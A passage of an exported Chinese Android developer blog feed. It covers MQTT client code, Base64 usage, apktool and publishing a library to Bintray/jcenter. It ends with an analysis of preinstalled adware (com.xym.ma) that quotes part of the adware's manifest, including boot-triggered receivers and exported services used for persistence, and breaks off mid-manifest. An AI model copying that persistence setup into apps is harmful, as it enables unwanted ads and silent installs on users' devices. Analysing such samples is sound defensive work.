class="line">    private ActContainer context;</span><br><span class="line">    @BindString(R.string.title_name_mqtt)</span><br><span class="line">    String title;</span><br><span class="line"></span><br><span class="line">    private String devTopic;</span><br><span class="line">    CallbackConnection connection;</span><br><span class="line">    @Override</span><br><span class="line">    public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public View onCreateView(LayoutInflater inflater, @Nullable ViewGroup container,</span><br><span class="line">                             @Nullable Bundle savedInstanceState) &#123;</span><br><span class="line">        View rootView = inflater.inflate(R.layout.fragment_mqtt, null);</span><br><span class="line">        unbinder = ButterKnife.bind(this, rootView);</span><br><span class="line">        return rootView;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onViewCreated(View rootView, @Nullable Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onViewCreated(rootView, savedInstanceState);</span><br><span class="line"></span><br><span class="line">        context = (ActContainer) getActivity();</span><br><span class="line">        context.setTitleName(title);</span><br><span class="line"></span><br><span class="line">        devTopic = &quot;hello&quot;;</span><br><span class="line">        try &#123;</span><br><span class="line">            MQTT mqtt = new MQTT();</span><br><span class="line">            mqtt.setHost(&quot;192.168.1.150&quot;, 1883);</span><br><span class="line">            connection = mqtt.callbackConnection();</span><br><span class="line">            connection.listener(new Listener() &#123;</span><br><span class="line"></span><br><span class="line">                public void onDisconnected() &#123;</span><br><span class="line">                    Log.i(TAG, &quot;onDisconnected.&quot;);</span><br><span class="line">                    sendMessageUI(0,&quot;onDisconnected&quot;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                public void onConnected() &#123;</span><br><span class="line">                    Log.i(TAG, &quot;onConnected.&quot;);</span><br><span class="line">                    sendMessageUI(0,&quot;onConnected&quot;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                public void onPublish(UTF8Buffer topic, Buffer payload, Runnable ack) &#123;</span><br><span class="line">                    // You can now process a received message from a topic.</span><br><span class="line">                    // Once process execute the ack runnable.</span><br><span class="line">                    ack.run();</span><br><span class="line"></span><br><span class="line">                    Log.i(TAG, &quot;onPublish: &quot; + payload.toString());</span><br><span class="line">                    //不能操作UI</span><br><span class="line">                    //tvHello.setText(payload.toString());</span><br><span class="line">                    sendMessageUI(1,payload.toString());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                public void onFailure(Throwable value) &#123;</span><br><span class="line">                    //connection.close(null); // a connection failure occured.</span><br><span class="line">                    connection.disconnect(null);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            connection.connect(new Callback&lt;Void&gt;() &#123;</span><br><span class="line">                public void onFailure(Throwable value) &#123;</span><br><span class="line">                    //result.failure(value); // If we could not connect to the server.</span><br><span class="line">                    Log.e(TAG, &quot;connect failure.&quot;);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                // Once we connect..</span><br><span class="line">                public void onSuccess(Void v) &#123;</span><br><span class="line"></span><br><span class="line">                    // Subscribe to a topic</span><br><span class="line">                    Topic[] topics = &#123;new Topic(devTopic, QoS.AT_LEAST_ONCE)&#125;;</span><br><span class="line">                    connection.subscribe(topics, new Callback&lt;byte[]&gt;() &#123;</span><br><span class="line">                        public void onSuccess(byte[] qoses) &#123;</span><br><span class="line">                            // The result of the subcribe request.</span><br><span class="line">                            Log.i(TAG, &quot;subscribe onSuccess.topic:&quot; + devTopic);</span><br><span class="line">                            //不能操作UI</span><br><span class="line">                            //tvHello.setText(&quot;subscribe onSuccess.&quot;);</span><br><span class="line">                            sendMessageUI(0,&quot;subscribe onSuccess.&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        public void onFailure(Throwable value) &#123;</span><br><span class="line">                            //connection.close(null); // subscribe failed.</span><br><span class="line">                            Log.e(TAG, &quot;subscribe failed.&quot;);</span><br><span class="line">                            sendMessageUI(0,&quot;subscribe failed.&quot;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void sendMessageUI(int what, String obj) &#123;</span><br><span class="line"></span><br><span class="line">        Message message = Message.obtain();</span><br><span class="line">        message.what = what;</span><br><span class="line">        message.obj = obj;</span><br><span class="line">        handler.sendMessage(message);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private Handler handler = new Handler() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void handleMessage(Message msg) &#123;</span><br><span class="line">            if(tvHello!=null)&#123;</span><br><span class="line">                switch (msg.what) &#123;</span><br><span class="line">                    case 1:</span><br><span class="line">                        //数据</span><br><span class="line">                        tvHello.setText(msg.obj.toString());</span><br><span class="line">                        break;</span><br><span class="line">                    default:</span><br><span class="line">                        //事件</span><br><span class="line">                        tvHello.setText(msg.obj.toString());</span><br><span class="line">                        break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            super.handleMessage(msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void onDestroyView() &#123;</span><br><span class="line">        super.onDestroyView();</span><br><span class="line">        unbinder.unbind();</span><br><span class="line">        connection.disconnect(null);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Java："><a href="#Java：" class="headerlink" title="Java："></a>Java：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">package com.demo;</span><br><span class="line"></span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">import org.fusesource.hawtbuf.Buffer;</span><br><span class="line">import org.fusesource.hawtbuf.UTF8Buffer;</span><br><span class="line">import org.fusesource.mqtt.client.Callback;</span><br><span class="line">import org.fusesource.mqtt.client.CallbackConnection;</span><br><span class="line">import org.fusesource.mqtt.client.Listener;</span><br><span class="line">import org.fusesource.mqtt.client.MQTT;</span><br><span class="line">import org.fusesource.mqtt.client.QoS;</span><br><span class="line">import org.fusesource.mqtt.client.Topic;</span><br><span class="line">import org.fusesource.mqtt.client.Tracer;</span><br><span class="line">import org.fusesource.mqtt.codec.MQTTFrame;</span><br><span class="line"></span><br><span class="line">public class Test &#123;</span><br><span class="line"></span><br><span class="line">	private static final String Topic = &quot;hello&quot;;</span><br><span class="line">	</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		try&#123;</span><br><span class="line">	        MQTT mqtt = new MQTT();</span><br><span class="line">	        mqtt.setHost(&quot;192.168.1.150&quot;, 1883);</span><br><span class="line">	        </span><br><span class="line">	        mqtt.setTracer(new Tracer()&#123;</span><br><span class="line">	            @Override</span><br><span class="line">	            public void onReceive(MQTTFrame frame) &#123;</span><br><span class="line">	                System.out.println(&quot;recv: &quot;+frame);</span><br><span class="line">	            &#125;</span><br><span class="line"></span><br><span class="line">	            @Override</span><br><span class="line">	            public void onSend(MQTTFrame frame) &#123;</span><br><span class="line">	                System.out.println(&quot;send: &quot;+frame);</span><br><span class="line">	            &#125;</span><br><span class="line"></span><br><span class="line">	            @Override</span><br><span class="line">	            public void debug(String message, Object... args) &#123;</span><br><span class="line">	                System.out.println(String.format(&quot;debug: &quot;+message, args));</span><br><span class="line">	            &#125;</span><br><span class="line">	        &#125;);</span><br><span class="line">	        </span><br><span class="line">	        final CallbackConnection connection = mqtt.callbackConnection();</span><br><span class="line">	        connection.listener(new Listener() &#123;</span><br><span class="line"></span><br><span class="line">	            public void onDisconnected() &#123;</span><br><span class="line">	                System.out.println( &quot;onDisconnected.&quot;);</span><br><span class="line">	            &#125;</span><br><span class="line">	            public void onConnected() &#123;</span><br><span class="line">	            	System.out.println(&quot;onConnected.&quot;);</span><br><span class="line">	            &#125;</span><br><span class="line">	            public void onPublish(UTF8Buffer topic, Buffer payload, Runnable ack) &#123;</span><br><span class="line">	                // You can now process a received message from a topic.</span><br><span class="line">	                // Once process execute the ack runnable.</span><br><span class="line">	                ack.run();</span><br><span class="line">	                System.out.println( &quot;onPublish: &quot; + payload.toString());</span><br><span class="line">	            &#125;</span><br><span class="line">	            public void onFailure(Throwable value) &#123;</span><br><span class="line">	                //connection.close(null); // a connection failure occured.</span><br><span class="line">	                connection.disconnect(null);</span><br><span class="line">	            &#125;</span><br><span class="line">	        &#125;);</span><br><span class="line">	        System.out.println(&quot;callback...&quot;);</span><br><span class="line"></span><br><span class="line">	        connection.connect(new Callback&lt;Void&gt;() &#123;</span><br><span class="line">	            public void onFailure(Throwable value) &#123;</span><br><span class="line">	                //result.failure(value); // If we could not connect to the server.</span><br><span class="line">	            	System.out.println( &quot;connect failure.&quot;);</span><br><span class="line">	            &#125;</span><br><span class="line">	            // Once we connect..</span><br><span class="line">	            public void onSuccess(Void v) &#123;</span><br><span class="line"></span><br><span class="line">	            	System.out.println( &quot;connect onSuccess.&quot;);</span><br><span class="line">	                // Subscribe to a topic</span><br><span class="line">	                Topic[] topics = &#123;new Topic(Topic, QoS.AT_LEAST_ONCE)&#125;;</span><br><span class="line">	                connection.subscribe(topics, new Callback&lt;byte[]&gt;() &#123;</span><br><span class="line">	                    public void onSuccess(byte[] qoses) &#123;</span><br><span class="line">	                        // The result of the subcribe request.</span><br><span class="line">	                    	System.out.println( &quot;subscribe onSuccess.&quot;);</span><br><span class="line">	                        connection.publish(Topic, &quot;Hello&quot;.getBytes(), QoS.AT_LEAST_ONCE, false, null);</span><br><span class="line"></span><br><span class="line">	                    &#125;</span><br><span class="line">	                    public void onFailure(Throwable value) &#123;</span><br><span class="line">	                        //connection.close(null); // subscribe failed.</span><br><span class="line">	                    	System.out.println( &quot;subscribe failed.&quot;);</span><br><span class="line">	                    &#125;</span><br><span class="line">	                &#125;);</span><br><span class="line">	            &#125;</span><br><span class="line">	        &#125;);</span><br><span class="line">	        </span><br><span class="line"></span><br><span class="line">	    &#125;catch (Exception e)&#123;</span><br><span class="line">	        e.printStackTrace();</span><br><span class="line">	    &#125;</span><br><span class="line">		//输入阻塞</span><br><span class="line">		Scanner sc = new Scanner(System.in);</span><br><span class="line">		sc.nextLine();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="各种参数"><a href="#各种参数" class="headerlink" title="各种参数"></a>各种参数</h4><p>这里有一篇文章写的很详细，我就懒的写了 <a href="http://blog.csdn.net/u011679955/article/details/71156450" target="_blank" rel="noopener">传送门</a>。</p>
<h4 id="在Linux下无法连接"><a href="#在Linux下无法连接" class="headerlink" title="在Linux下无法连接"></a>在Linux下无法连接</h4><p>写了个web程序在Linux下部署发现一个问题，无法连接上服务器，没有任何报错的信息。（<code>在Windows下是正常连接的</code>）<br>网上找一下，原来这个库会获取Host，失败就卡住了，我的Linux机器修改过HostName，所以就出问题了。<code>其实这个问题在spring-boot-starter-data-redis也存在，但是spring-boot-starter-data-redis有报错信息。</code><br>解决办法也比较简单，把当前的HostName加入到/etc/hosts文件就可以了<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@bogon:~# hostname</span><br><span class="line">bogon</span><br><span class="line">root@bogon:~# vim /etc/hosts</span><br><span class="line"></span><br><span class="line">#加入</span><br><span class="line">127.0.1.1       bogon</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>Java和Android的Base64加密解密</title>
    <url>/Android/Java%E5%92%8CAndroid%E7%9A%84Base64%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/</url>
    <content><![CDATA[<h4 id="Java8"><a href="#Java8" class="headerlink" title="Java8"></a>Java8</h4><p>Java8上的自带Base64工具<code>java.util.Base64;</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//编码</span></span><br><span class="line">Base64.getEncoder().encodeToString(<span class="string">"Hello"</span>.getBytes(<span class="string">"utf-8"</span>));  </span><br><span class="line"></span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line"><span class="keyword">byte</span>[] asBytes = Base64.getDecoder().decode(<span class="string">"SGVsbG8="</span>);  </span><br><span class="line">System.out.println(<span class="keyword">new</span> String(asBytes, <span class="string">"utf-8"</span>));</span><br></pre></td></tr></table></figure>
<h4 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h4><p>Android SDK 自带 <code>android.util.Base64;</code></p>
<table>
<thead>
<tr>
<th>Public methods</th>
</tr>
</thead>
<tbody>
<tr>
<td>static byte[]</td>
<td><code>decode(String str, int flags)</code> Decode the Base64-encoded data in input and return the data in a new byte array.</td>
</tr>
<tr>
<td>static byte[]</td>
<td><code>decode(byte[] input, int flags)</code>  Decode the Base64-encoded data in input and return the data in a new byte array.</td>
</tr>
<tr>
<td>static byte[]</td>
<td><code>decode(byte[] input, int offset, int len, int flags)</code>  Decode the Base64-encoded data in input and return the data in a new byte array.</td>
</tr>
<tr>
<td>static byte[]</td>
<td><code>encode(byte[] input, int flags)</code> Base64-encode the given data and return a newly allocated byte[] with the result.</td>
</tr>
<tr>
<td>static byte[]</td>
<td><code>encode(byte[] input, int offset, int len, int flags)</code> Base64-encode the given data and return a newly allocated byte[] with the result.</td>
</tr>
<tr>
<td>static String</td>
<td><code>encodeToString(byte[] input, int offset, int len, int flags)</code> Base64-encode the given data and return a newly allocated String with the result.</td>
</tr>
<tr>
<td>static String</td>
<td><code>encodeToString(byte[] input, int flags)</code> Base64-encode the given data and return a newly allocated String with the result.</td>
</tr>
</tbody>
</table>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getEncoder</span><span class="params">(String str)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//return Base64.encodeToString(str.getBytes("utf-8"),Base64.DEFAULT);</span></span><br><span class="line">        <span class="comment">//android sdk 27</span></span><br><span class="line">        <span class="keyword">return</span> Base64.encode(str.getBytes(<span class="string">"utf-8"</span>),Base64.DEFAULT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getDecoder</span><span class="params">(String encode)</span> <span class="keyword">throws</span> UnsupportedEncodingException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] asBytes = Base64.decode(encode,Base64.DEFAULT);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String(asBytes, <span class="string">"utf-8"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>apktool</title>
    <url>/Android/apktool/</url>
    <content><![CDATA[<p>onekey-decompile-apk不更新apktool就没什么用了，这时候可以直接用apktool</p>
<p>下载地址： <a href="https://ibotpeaches.github.io/Apktool/install/" target="_blank" rel="noopener">https://ibotpeaches.github.io/Apktool/install/</a><br>下载bat：<a href="https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat" target="_blank" rel="noopener">https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat</a></p>
<p>用win的终端运行：apktool d xx.apk</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
  </entry>
  <entry>
    <title>android-library-jcenter</title>
    <url>/Android/android-library-jcenter/</url>
    <content><![CDATA[<blockquote>
<p>参考:</p>
<ol>
<li><a href="https://blog.csdn.net/yanzhenjie1003/article/details/51672530" target="_blank" rel="noopener">AndroidStuio快速发布开源项目到Jcenter/Bintray</a></li>
<li><a href="https://code.tutsplus.com/zh-hans/tutorials/creating-and-publishing-an-android-library--cms-24582" target="_blank" rel="noopener">创建并发布一个 Android 库</a></li>
<li><a href="https://blog.csdn.net/Evan_huangchun/article/details/78194052" target="_blank" rel="noopener">Android Library上传到GitHub并一键发布到Bintray或JCenter</a></li>
</ol>
</blockquote>
<p><strong> 本文只记录操作步骤 </strong><br><strong> 本文只记录操作步骤 </strong><br><strong> 本文只记录操作步骤 </strong></p>
<h3 id="apikey"><a href="#apikey" class="headerlink" title="apikey"></a>apikey</h3><p>登录 <a href="https://bintray.com" target="_blank" rel="noopener">bintray</a> 拿到apikey，不需要创建仓库，默认已有maven/nuget等7个仓库，我们用maven就可以，当然也可以创建一个属于自己的maven仓库。</p>
<h3 id="创建库项目"><a href="#创建库项目" class="headerlink" title="创建库项目"></a>创建库项目</h3><p>以下是我的项目目录结构，app是示例Android app，pageablelibrary就是我们要发布的module。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── app</span><br><span class="line">├── build.gradle</span><br><span class="line">├── gradle</span><br><span class="line">│   └── wrapper</span><br><span class="line">│       ├── gradle-wrapper.jar</span><br><span class="line">│       └── gradle-wrapper.properties</span><br><span class="line">├── gradle.properties</span><br><span class="line">├── gradlew</span><br><span class="line">├── gradlew.bat</span><br><span class="line">├── local.properties</span><br><span class="line">├── pageablelibrary</span><br><span class="line">│   ├── build.gradle</span><br><span class="line">│   ├── libs</span><br><span class="line">│   ├── pageablelibrary.iml</span><br><span class="line">│   └── proguard-rules.pro</span><br><span class="line">├── PageableLibrary.iml</span><br><span class="line">├── README.md</span><br><span class="line">└── settings.gradle</span><br></pre></td></tr></table></figure></p>
<h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>./build.gradle<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">       classpath &apos;com.android.tools.build:gradle:3.1.3&apos;</span><br><span class="line">	</span><br><span class="line">	//新增</span><br><span class="line">       classpath &apos;com.github.dcendents:android-maven-gradle-plugin:1.5&apos;</span><br><span class="line">       classpath &apos;com.jfrog.bintray.gradle:gradle-bintray-plugin:1.7.2&apos;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>
<p>./pageablelibrary/build.gradle<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apply plugin: &apos;com.android.library&apos;</span><br><span class="line">//新增</span><br><span class="line">apply plugin: &apos;com.github.dcendents.android-maven&apos;</span><br><span class="line">apply plugin: &apos;com.jfrog.bintray&apos;</span><br></pre></td></tr></table></figure></p>
<h3 id="配置发布信息"><a href="#配置发布信息" class="headerlink" title="配置发布信息"></a>配置发布信息</h3><p>./pageablelibrary/build.gradle 在最后一行加入以下内容<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">// 项目引用的版本号，比如 implementation &apos;com.kevinvane:demo:1.0.1&apos;</span><br><span class="line">group = &quot;com.kevinwen&quot;</span><br><span class="line">version = &quot;1.0.1&quot;</span><br><span class="line"></span><br><span class="line">def siteUrl = &apos;https://github.com/kevinvane/PageableLibrary&apos; // 项目主页。</span><br><span class="line">def gitUrl = &apos;git@github.com:kevinvane/PageableLibrary.git&apos; // Git仓库的url。</span><br><span class="line"></span><br><span class="line">install &#123;</span><br><span class="line">    repositories.mavenInstaller &#123;</span><br><span class="line">        pom &#123;</span><br><span class="line">            project &#123;</span><br><span class="line">                packaging &apos;aar&apos;</span><br><span class="line">                //项目描述</span><br><span class="line">                name &apos;Pageable Library For Android&apos;// 可选，项目名称。</span><br><span class="line">                description &apos;The Android Pageable Library.&apos;// 可选，项目描述。</span><br><span class="line">                url siteUrl</span><br><span class="line"></span><br><span class="line">                licenses &#123;</span><br><span class="line">                    license &#123;</span><br><span class="line">                        name &apos;The Apache Software License, Version 2.0&apos;</span><br><span class="line">                        url &apos;http://www.apache.org/licenses/LICENSE-2.0.txt&apos;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                //填写开发者基本信息，复制我的，这里需要修改。</span><br><span class="line">                developers &#123;</span><br><span class="line">                    developer &#123;</span><br><span class="line">                        id &apos;kevinenjoy &apos; // 开发者的id。</span><br><span class="line">                        name &apos;Sam&apos; // 开发者名字。</span><br><span class="line">                        email &apos;kevinwenwork@qq.com&apos; // 开发者邮箱。</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                scm &#123;</span><br><span class="line">                    connection gitUrl</span><br><span class="line">                    developerConnection gitUrl</span><br><span class="line">                    url siteUrl</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">task sourcesJar(type: Jar) &#123;</span><br><span class="line">    from android.sourceSets.main.java.srcDirs</span><br><span class="line">    classifier = &apos;sources&apos;</span><br><span class="line">&#125;</span><br><span class="line">task javadoc(type: Javadoc) &#123;</span><br><span class="line">    source = android.sourceSets.main.java.srcDirs</span><br><span class="line">    classpath += project.files(android.getBootClasspath().join(File.pathSeparator))</span><br><span class="line">    failOnError false // 忽略注释语法错误，如果用jdk1.8你的注释写的不规范就编译不过。</span><br><span class="line">&#125;</span><br><span class="line">task javadocJar(type: Jar, dependsOn: javadoc) &#123;</span><br><span class="line">    classifier = &apos;javadoc&apos;</span><br><span class="line">    from javadoc.destinationDir</span><br><span class="line">&#125;</span><br><span class="line">artifacts &#123;</span><br><span class="line">    archives javadocJar</span><br><span class="line">    archives sourcesJar</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 这里是读取Bintray相关的信息，我们上传项目到github上的时候会把gradle文件传上去，所以不要把帐号密码的信息直接写在这里，写在local.properties中，这里动态读取。</span><br><span class="line">Properties properties = new Properties()</span><br><span class="line">properties.load(project.rootProject.file(&apos;local.properties&apos;).newDataInputStream())</span><br><span class="line">bintray &#123;</span><br><span class="line">    user = properties.getProperty(&quot;bintray.user&quot;) // Bintray的用户名。</span><br><span class="line">    key = properties.getProperty(&quot;bintray.apikey&quot;) // Bintray刚才保存的ApiKey。</span><br><span class="line"></span><br><span class="line">    configurations = [&apos;archives&apos;]</span><br><span class="line">    pkg &#123;</span><br><span class="line">        repo = &quot;maven&quot;</span><br><span class="line">        name = &quot;PageableLibrary&quot;// 发布到Bintray上的项目名字，不是引用的名称</span><br><span class="line">        userOrg = user</span><br><span class="line">        websiteUrl = siteUrl</span><br><span class="line">        vcsUrl = gitUrl</span><br><span class="line">        licenses = [&quot;Apache-2.0&quot;]</span><br><span class="line">        publish = true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="配置隐私信息"><a href="#配置隐私信息" class="headerlink" title="配置隐私信息"></a>配置隐私信息</h3><p>以下两行是bintray的用户名称和apikey，这是很重要的信息，我们放在<code>./local.properties</code>文件保存<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user = properties.getProperty(&quot;bintray.user&quot;) // Bintray的用户名。</span><br><span class="line">key = properties.getProperty(&quot;bintray.apikey&quot;)</span><br></pre></td></tr></table></figure></p>
<p><code>./local.properties</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bintray.user=kevinenjoy</span><br><span class="line">bintray.apikey=xxxx</span><br></pre></td></tr></table></figure></p>
<h3 id="执行命令发布到-bintray"><a href="#执行命令发布到-bintray" class="headerlink" title="执行命令发布到 bintray"></a>执行命令发布到 bintray</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ./gradlew install</span><br><span class="line">$ ./gradlew bintrayUpload</span><br><span class="line"></span><br><span class="line">BUILD SUCCESSFUL in 13s</span><br><span class="line">29 actionable tasks: 2 executed, 27 up-to-date</span><br></pre></td></tr></table></figure>
<p>如果有 <code>BUILD SUCCESSFUL</code>提示信息，表示成功了，登录到 <a href="https://bintray.com" target="_blank" rel="noopener">bintray</a> 看一下maven仓库，发现我们的库已经发布上来了。<br>目前为止，我们已经把库发布到了 <code>bintray</code></p>
<h3 id="发布到-jcenter"><a href="#发布到-jcenter" class="headerlink" title="发布到 jcenter"></a>发布到 jcenter</h3><p>JCenter是Android默认使用的仓库，登录到 <a href="https://bintray.com" target="_blank" rel="noopener">bintray</a>，进入库项目，单击 <code>Add to JCenter</code> 按钮，填一下简介信息，提交审核，审核通过就行了。</p>
<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>如果通过审核，直接引用就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">implementation &apos;com.kevinwen:pageablelibrary:1.0.1@aar&apos;</span><br></pre></td></tr></table></figure>
<p>没有通过审核一样可以用，只不过要指定<code>repositories</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">buildscript &#123;</span><br><span class="line">    </span><br><span class="line">    repositories &#123;</span><br><span class="line">        google()</span><br><span class="line">	//指定maven仓库为我账号的maven账号</span><br><span class="line">        maven &#123;</span><br><span class="line">            url &apos;https://dl.bintray.com/kevinenjoy/maven&apos;</span><br><span class="line">        &#125;</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">    dependencies &#123;</span><br><span class="line">        classpath &apos;com.android.tools.build:gradle:3.1.2&apos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：<code>https://dl.bintray.com/kevinenjoy/maven</code> 中的 <code>kevinenjoy/maven</code>就是我们配置项目的地址，其中<code>kevinenjoy</code>是我们的账号，<code>maven</code>是我们账号里面的maven仓库。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>jcenter配置还是有点复杂的，而且编译提交容易出现错误，这时候有一个更加简单的仓库JitPack。JitPack不用本地做配置，只要将项目放在github上，release一个版本，将URL放在JitPack上可以了，是不是很方便？<a href="https://www.jianshu.com/p/005fe5ac5c84" target="_blank" rel="noopener">简单三步发布自己的开源库到JitPack</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>com-xym-ma流氓软件</title>
    <url>/Android/com-xym-ma%E6%B5%81%E6%B0%93%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[<p>Android机子刷机，遇到个频率（几秒一次）弹广告的内置流氓软件，作为service运行，可以进程保活，也就是强行关闭进程，它可以重新启动，非常恶心，时不时就来一个全屏广告，自动下载其他的apk安装包，自动安装。电脑管家是识别为木马的。<br>看了一下他的 AndroidManifest.xml<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;</span><br><span class="line">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; package=&quot;com.xym.ma&quot; platformBuildVersionCode=&quot;19&quot; platformBuildVersionName=&quot;4.4.2-1456859&quot;&gt;</span><br><span class="line">    &lt;application android:icon=&quot;@drawable/ic_launcher&quot; android:label=&quot;xym&quot; android:name=&quot;com.xym.ma.a&quot;&gt;</span><br><span class="line">        &lt;activity android:exported=&quot;true&quot; android:name=&quot;com.xym.ma.b&quot; android:screenOrientation=&quot;portrait&quot; android:theme=&quot;@android:style/Theme.Translucent&quot;/&gt;</span><br><span class="line">        &lt;meta-data android:name=&quot;googlepotatooid&quot; android:value=&quot;712c9cef25b42dc4&quot;/&gt;</span><br><span class="line">        &lt;meta-data android:name=&quot;googlepotatoo_channel&quot; android:value=&quot;ch0117&quot;/&gt;</span><br><span class="line">        &lt;meta-data android:name=&quot;googlepotatoo_jd&quot; android:value=&quot;true&quot;/&gt;</span><br><span class="line">        &lt;activity android:name=&quot;com.zuhn.mkn.d.a&quot; android:screenOrientation=&quot;portrait&quot; android:theme=&quot;@android:style/Theme.Translucent.NoTitleBar&quot;&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=&quot;com.zuhn.mkn.activity&quot;/&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/activity&gt;</span><br><span class="line">        &lt;service android:exported=&quot;true&quot; android:name=&quot;com.zuhn.mkn.b.a&quot;/&gt;</span><br><span class="line">        &lt;receiver android:name=&quot;com.zuhn.mkn.a.b&quot;&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;/&gt;</span><br><span class="line">                &lt;action android:name=&quot;android.intent.action.USER_PRESENT&quot;/&gt;</span><br><span class="line">                &lt;action android:name=&quot;com.zuhn.mkn.destory&quot;/&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">        &lt;/receiver&gt;</span><br><span class="line">        &lt;activity android:label=&quot;JDBrowserActivity&quot; android:name=&quot;com.jd.jdadsdk.JDAdBrowser&quot; android:screenOrientation=&quot;portrait&quot; android:theme=&quot;@android:style/Theme.Translucent.NoTitleBar&quot;/&gt;</span><br><span class="line">        &lt;service android:exported=&quot;false&quot; android:name=&quot;com.qq.e.comm.DownloadService&quot;/&gt;</span><br><span class="line">        &lt;activity android:configChanges=&quot;keyboard|keyboardHidden|orientation|screenSize&quot; android:name=&quot;com.qq.e.ads.ADActivity&quot;/&gt;</span><br><span class="line">    &lt;/application&gt;</span><br><span class="line">    &lt;uses-permission 